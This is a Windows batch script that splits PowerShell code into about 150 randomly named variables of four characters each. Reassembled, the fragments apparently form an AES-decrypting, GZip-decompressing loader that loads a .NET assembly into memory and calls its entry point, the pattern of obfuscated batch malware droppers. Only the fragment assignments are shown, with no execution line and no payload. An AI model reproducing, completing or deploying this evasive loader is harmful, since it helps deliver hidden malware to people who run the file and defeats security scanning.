@echo off
set "HmkhlKOlHB=rans"
set "rDPCCkapNV=ptog"
set "xjrTvXErLw=pmRB"
set "zIUnARTSCr= [Sy"
set "EuhYWvVrfG=ew-O"
set "sHSFltcYbp=m.Re"
set "ncsqKhZAJt=eMVs"
set "MyYIZlEHEc=Invo"
set "PhurfylfpX=:('g"
set "GAzQEbzRVi=dj0C"
set "gqTLQIEwRy=Bmor"
set "qdGZvDHvNu=fore"
set "wfmtegjzgV= = N"
set "usgCnQqybk=.Ass"
set "fQgScpmrJW=zuZI"
set "LEHMudLGPo=OMts"
set "RDZqbXsNHd=gth)"
set "EwWZFBmUgB=yste"
set "qqxFDTcCNV=16] "
set "DKZtdQeFmr=ionM"
set "ifFSewhxrK='gni"
set "fqufbISqyM=yste"
set "PSxKPhssHa=$qFt"
set "MLLmRhtsgS=oin "
set "FdjDMwDYOo=6] -"
set "znjjpBVLkb=Kzyu"
set "mlhlNNDzMG=ert]"
set "aUKPHSirea=onve"
set "hNraBtASWu=nage"
set "MZBXVapfXM=CV);"
set "LaQowHGWGH=sion"
set "SaIyvGIxpB=Disp"
set "xqJnipGPxR===')"
set "HjFnJkrHbZ=pose"
set "jIOqztfmqh=UyCV"
set "zgeZMrcUIO=;$pm"
set "PfbXUzgWoJ=join"
set "BBcLmBEoOY=[Env"
set "EwNIntwkUF=;$OM"
set "oskXkiSVtV=FtmY"
set "lILcTKDBvL=m.IO"
set "DhAhJbxyNe=ptor"
set "EbiGbloDyL=V.En"
set "QJGeiOocnE=My ="
set "rClogbMtuM=Secu"
set "tYRLczuDje=-nop"
set "gCIryRYdrD=('%*'"
set "ynqRKFqSYE=::De"
set "yxxPRYZvgt=.Key"
set "GFWKvkKreT=]::("
set "svnTByLjEt=ck($"
set "JPgNzRGBKa=esMa"
set "zmGIOKSpOx=MtjU"
set "dJlpbUXGEP=t Sy"
set "ApfiokJqLR=Star"
set "lnYialZGcE=O.Me"
set "mqcmDlKUOF=[Sys"
set "wHUuHbTiOQ=[Sys"
set "OpDUqAYDFh=null"
set "EwMhosmKhd=iron"
set "FhfEquofKX=cft "
set "WarVebLfuS=ke($"
set "TUSXWUiCKI=Conv"
set "OJoptdOvwF=em.I"
set "FgyBHEtHoy=raph"
set "rgVhIvhgVT=stem"
set "kAKkuzVHoa=bstr"
set "KaKinDOFTW=CMtj"
set "erAaCpthIx=);$C"
set "cXkoWsTnKM=ect "
set "UKRCNEvXzv=ptog"
set "jVnEDSaUdY=rtS4"
set "ulkPqPNjPL=ode]"
set "sgUimLYatC=FtmY"
set "NWvTVUHJcb=Iqq."
set "OWqlduCAub=oArr"
set "ehFDNXEEha=gjYA"
set "YwybyMNgAh=rity"
set "tLkFiIJrsZ=.Cop"
set "HocRoWOpCV=raph"
set "kxHBRxXpzv=();$"
set "HPElqGMIGy=CyKX"
set "UNicQlpFqh=('Tg"
set "qKagSAybzS=ss -"
set "bJNwwFGjho=t.Su"
set "JYkfzvKsXt= = $"
set "wUJUagVglv=V = "
set "oiYulzyycx=$ZUy"
set "DKtVaSwcZk=comp"
set "HdcglTJlkC=orF'"
set "FhhuPjVqZb=w = "
set "HRrGpOpGcR=pres"
set "ZlHFHLwMJm=Secu"
set "LWclDAJMWB=106u"
set "wtwAcYpnmD=oint"
set "HtElKSjlkW=..-1"
set "oHIbxvMYex=);$q"
set "VkNfrxaZIa=lBlo"
set "OAkJifBLtT=brea"
set "YDyJwvqitT=Comp"
set "nDdFzPUSKM=-joi"
set "fwuTAKVNqT=.IO."
set "TcAwWQHXEY=.Con"
set "hHlFwuIxEm=[Sys"
set "eutYndPrGJ=:: '"
set "UPYUDKHMMC=Syst"
set "LovQsSczgj=)($Z"
set "GOuBHihpbH=.Cry"
set "zQukkKssgD=F'[-"
set "KloVqLlAIO=ment"
set "FIofkHUdJO=1] -"
set "GjrNFSRdUM=New-"
set "gyQXLVRsJF=Fina"
set "lERcyRMvAW=ypto"
set "GSTLZApSTd=Mode"
set "RVCkmTRsYp== $q"
set "EowmORoiLp=ecry"
set "fjcCVjMdtb=('da"
set "ypHpCLSyfL=bJh "
set "oQQYlKxOnN=stem"
set "kYQsaaJypG=$wKz"
set "nMLUbqDvgp=.GZi"
set "yotBLqiVlO=$wKz"
set "OAFlStxxHC=-1.."
set "lpNnEZtuxK=[-1."
set "obbpFzXirc=.Mod"
set "iBcrCPQVEt==');"
set "FUaaiisPGr=)($w"
set "lLEwYPDctu=s75K"
set "FGbzDniKYX=FtmY"
set "GbUIULhiWM=y]::"
set "ANgDhFaHkh=ispo"
set "aEPlVrnvnw=oL'["
set "tPLJOVGakj=y) {"
set "YzRigkIlDm=;$CI"
set "EgLcVFaDoV=pher"
set "PIYYhnIFoG=RBV "
set "ZjZJVBFbdm=);$q"
set "FfRQxZAYKF=Obje"
set "dRoQUZllUZ=RmAx"
set "QHMrvQZPTJ=trea"
set "PvnALsiSrm=form"
set "aJikDbnJCP=ing("
set "plVJvxVLhh=mory"
set "vrmsicjUeg=).Sp"
set "SsnTKsgVRT=yu);"
set "valsZuSHKq=.Dis"
set "AfOTtUCLpN=grap"
set "GTRwnYEVCy=;$Nb"
set "YwDXhElIwB=yu.T"
set "tZMWCLAFuA=ddin"
set "UCLJLopKFG=$wKz"
set "tADJlYQsNz=FtmY"
set "VOKwBqcNxW=n ''"
